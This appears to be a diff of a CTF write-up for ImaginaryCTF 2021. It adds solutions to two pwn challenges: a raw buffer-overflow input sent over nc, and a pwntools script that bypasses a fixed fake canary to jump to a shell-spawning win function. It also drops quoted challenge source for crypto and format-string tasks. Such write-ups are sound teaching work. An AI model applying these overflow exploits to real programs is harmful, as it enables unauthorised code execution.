@@ -13,8 +13,8 @@ Challenge | Category | Points | Solves | Comments
 [Chicken Caesar Salad](#chicken-caesar-salad-crypto-50-pts) | Crypto | 50 | 929
 [Hidden](#hidden-forensics-50-pts) | Forensics | 50 | 740
 [Roos World](Roos%20World/README.md) | Web | 50 | 853 | Exploration into JSFuck
-Stackoverflow | Pwn | 50 | 413
-Fake Canary | Pwn | 100 | 207
+[Stackoverflow](#stackoverflow-pwn-50-pts) | Pwn | 50 | 413
+[Fake Canary](#fake-canary-pwn-100-pts) | Pwn | 100 | 207
 [Flip Flops](#flip-flops-crypto-100-pts) | Crypto | 100 | 160
 [Formatting](#formatting-misc-100-pts) | Misc | 100 | 302
 [Spelling Test](#spelling-test-misc-100-pts) | Misc | 100 | 303
@@ -110,9 +110,87 @@ Or do `strings challenge.psd | grep ictf` to get the flag.
 ictf{wut_how_do_you_see_this}
 ```
 
-## stackoverflow | Pwn | 50
+## stackoverflow (Pwn, 50 pts)
 
-## Fake Canary | Pwn | 100
+**Description**
+
+Welcome to Stack Overflow! Get answers to all your programming questions right here!
+
+**Attachments**
+
+[stackoverflow](_Attachments/stackoverflow)
+
+**Solution**
+
+Classic stack overflow; let's look at the disassembly.
+
+![image](https://user-images.githubusercontent.com/11196638/128671598-7a95bac3-db24-4747-a5fb-260eee9d98e2.png)
+
+So it reads via `scanf` to the buffer at `rbp-0x30`; there's also a `DEBUG MODE` line after some check, which is `cmp qword [var_8h], 0x69637466; jne 0x85f`. So it compares whatever's at `rbp-0x8` to `0x69637466`, which is "ictf" backwords. Then our objective is to write 0x28 bytes of anything and then write "ftci".
+
+```
+$ nc chal.imaginaryctf.org 42001
+Welcome to StackOverflow! Before you start ~~copypasting code~~ asking good questions, we would like you to answer a question. What's your favorite color?
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAftci
+Thanks! Now onto the posts!
+DEBUG MODE ACTIVATED.
+$ cat flag.txt
+ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}
+```
+
+**Flag**
+```
+ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}
+```
+
+## Fake Canary (Pwn, 100 pts)
+
+**Description**
+
+Here at Stack Smasher Inc, we protect all our stacks with industry grade canaries!
+
+**Attachments**
+
+[fake_canary](_Attachments/fake_canary)
+
+**Solution**
+
+Checksec: 
+```
+baba@baba:~$ checksec fake_canary
+[*] '/home/baba/fake_canary'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+No PIE, no canaries. Let's look into the binary:
+
+![image](https://user-images.githubusercontent.com/11196638/128673235-4367a0b9-6cf5-4e85-9ae3-1578535b72d2.png)
+
+There's `main`, and there's also a `win` function at `0x400725` that calls `system('/bin/sh')`. It also uses `gets` into `rbp-0x30`, so it should be a simple buffer overflow. The "canary" used here at `rbp-0x8` is just `0xdeadbeef` by inspection (haha, "industry grade" canaries).
+
+``` py
+import pwn
+
+p = pwn.process('./ctf/ictf2021/fake_canary')
+p.recv(4096)
+p.send(b'A'*0x28 + pwn.p64(0xdeadbeef) + b'A'*8 + pwn.p64(0x400725))
+p.interactive()
+```
+
+spawns a shell.
+
+**Comments**
+
+It kept segfaulting while trying to reproduce the solution - while correctly getting to `system('/bin/sh')`, it crashed at an instruction `movaps`. Apparently this instruction has to be aligned to [16-byte boundary](https://c9x.me/x86/html/file_module_x86_id_180.html), and surely enough `$rsp` was not aligned to 16 bytes. Adding a `ret` gadget before returning to `win` solved that issue. I wonder how they avoided it in the actual challenge...
+
+**Flag**
+```
+ictf{m4ke_y0ur_canaries_r4ndom_f492b211}
+```
 
 ## Flip Flops (Crypto, 100 pts)
 
@@ -125,64 +203,6 @@ Yesterday, Roo bought some new flip flops. Let's see how good at flopping you ar
 [`flop.py`](_Attachments/flop.py)
 
 **Solution**
-
-`flop.py`:
-``` python
-#!/usr/local/bin/python
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-import binascii
-import os
-
-print('''
-                                        ,,~~~~~~,,..
-                             ...., ,'~             |
-                             \    V                /
-                              \  /                 /
-                              ;####>     @@@@@     )
-                              ##;,      @@@@@@@    )
-                           .##/  ~>      @@@@@   .   .
-                          ###''#>              '      '
-      .:::::::.      ..###/ #>               '         '
-     //////))))----~~ ## #}                '            '
-   ///////))))))                          '             '
-  ///////)))))))\                        '              '
- //////)))))))))))                                      '
- |////)))))))))))))____________________________________).
-|||||||||||||||||||||||||||||||||||||||||||||||||||||||||
-
-(yeah they're not flip flops but close enough)
-
-''')
-
-key = os.urandom(16)
-iv = os.urandom(16)
-flag = open("flag.txt").read().strip()
-
-
-for _ in range(3):
-	print("Send me a string that when decrypted contains 'gimmeflag'.")
-	print("1. Encrypt")
-	print("2. Check")
-	choice = input("> ")
-	if choice == "1":
-		cipher = AES.new(key, AES.MODE_CBC, iv)
-		pt = binascii.unhexlify(input("Enter your plaintext (in hex): "))
-		if b"gimmeflag" in pt:
-			print("I'm not making it *that* easy for you :kekw:")
-		else:
-			print(binascii.hexlify(cipher.encrypt(pad(pt, 16))).decode())
-	else:
-		cipher = AES.new(key, AES.MODE_CBC, iv)
-		ct = binascii.unhexlify(input("Enter ciphertext (in hex): "))
-		assert len(ct) % 16 == 0
-		if b"gimmeflag" in cipher.decrypt(ct):
-			print(flag)
-		else:
-			print("Bad")
-
-print("Out of operations!")
-```
 
 So our input is encrypted and decrypted via AES-CBC. I don't know much about encryption, but reading through the [Wikipedia page](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC)), the encryption and decryption process involves xor'ing the previous block (16 bytes) of ciphertext with the next block of plaintext/decrypted text. Since the key and IV are initialized before the `for` loop, we have 3 chances to encrypt/decrypt with the same key and IV. Our objective is to recover 'gimmeflag' from the ciphertext, without directly encrypting 'gimmeflag'.
 
@@ -256,41 +276,6 @@ Wait, I thought format strings were only in C???
 [`stonks.py`](_Attachments/stonks.py)
 
 **Solution**
-
-`stonks.py`:
-``` python
-#!/usr/bin/env python3
-
-art = '''
-                                         88
-            ,d                           88
-            88                           88
-,adPPYba, MM88MMM ,adPPYba,  8b,dPPYba,  88   ,d8  ,adPPYba,
-I8[    ""   88   a8"     "8a 88P'   `"8a 88 ,a8"   I8[    ""
- `"Y8ba,    88   8b       d8 88       88 8888[      `"Y8ba,
-aa    ]8I   88,  "8a,   ,a8" 88       88 88`"Yba,  aa    ]8I
-`"YbbdP"'   "Y888 `"YbbdP"'  88       88 88   `Y8a `"YbbdP"'
-'''
-
-flag = open("flag.txt").read()
-
-class stonkgenerator: # I heard object oriented programming is popular
-    def __init__(self):
-        pass
-    def __str__(self):
-        return "stonks"
-
-def main():
-    print(art)
-    print("Welcome to Stonks as a Service!")
-    print("Enter any input, and we'll say it back to you with any '{a}' replaced with 'stonks'! Try it out!")
-    while True:
-        inp = input("> ")
-        print(inp.format(a=stonkgenerator()))
-
-if __name__ == "__main__":
-    main()
-```
 
 As suggested by the name of the challenge and the description, the python code has a format string to our input: `inp.format(a=stonkgenerator())`. Python functions have a `__globals__` attribute ([documentation](https://docs.python.org/3/reference/datamodel.html#the-standard-type-hierarchy)), which is a dictionary holding the global variables of the function. Since `stonkgenerator` is a class with `__init__` and `__str__` methods, we can use those to get access to the global variable `flag`.
 
